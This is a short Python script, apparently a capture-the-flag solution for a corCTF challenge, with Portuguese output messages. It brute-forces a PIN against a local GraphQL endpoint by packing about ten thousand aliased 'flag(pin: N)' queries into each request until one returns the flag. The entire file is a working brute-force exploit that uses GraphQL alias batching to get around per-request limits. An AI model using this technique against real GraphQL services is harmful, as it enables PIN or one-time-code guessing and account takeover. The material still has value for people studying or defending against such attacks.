#!/usr/bin/env python3

import requests

headers = {
    'Content-Type': 'text/plain;charset=UTF-8',
}

for m in range(0, 10):
    
    query = 'query GetFlag{\n'
    
    print(f"Tentativa {m}: Testando valores de {m*10000} ate {(m+1)*10000}")
    for i in range(1, 10000): 
        index = m * 10000 + i 
        query += f'f{index}: flag(pin: {index})\n'
        
    query += '}'
    
    response = requests.post('http://localhost:8080/', headers=headers, data=query)
    print(f"Response: {response.status_code}")
    dados = response.json()
    resultados = dados.get('data')
    
    for keyPin, answer in resultados.items():
        if "corctf" in answer:
            pin = keyPin[1:]
            
            print(f"A chave é {pin} e a flag é {answer}")
            
            exit()
